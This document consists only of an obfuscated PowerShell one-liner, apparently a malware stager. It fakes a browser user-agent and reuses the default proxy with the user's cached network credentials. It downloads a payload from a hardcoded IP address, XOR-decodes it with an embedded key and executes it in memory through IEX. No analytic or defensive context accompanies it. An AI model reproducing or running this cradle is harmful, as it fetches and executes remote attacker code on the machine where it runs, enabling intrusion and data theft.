
[SyStem.NeT.SeRViCEPOINtMaNAgER]::ExpeCt100ContinUE = 0;$Wc=NEW-ObJEcT SYStEM.NeT.WEbCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEADErs.AdD('User-Agent',$u);$wc.PrOXy = [SYSTEM.NeT.WebREqUest]::DeFaultWEbProxy;$WC.PRoxy.CreDenTIAls = [SySTEm.NEt.CReDEnTialCaCHe]::DEfAULtNETwoRKCREdEnTiaLS;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[cHAr[]]$B=([chAr[]]($Wc.DoWNloaDStRiNg("http://138.121.170.12:3138/index.asp")))|%{$_-BXOr$k[$i++%$K.LENGth]};IEX ($b-JoIn'')

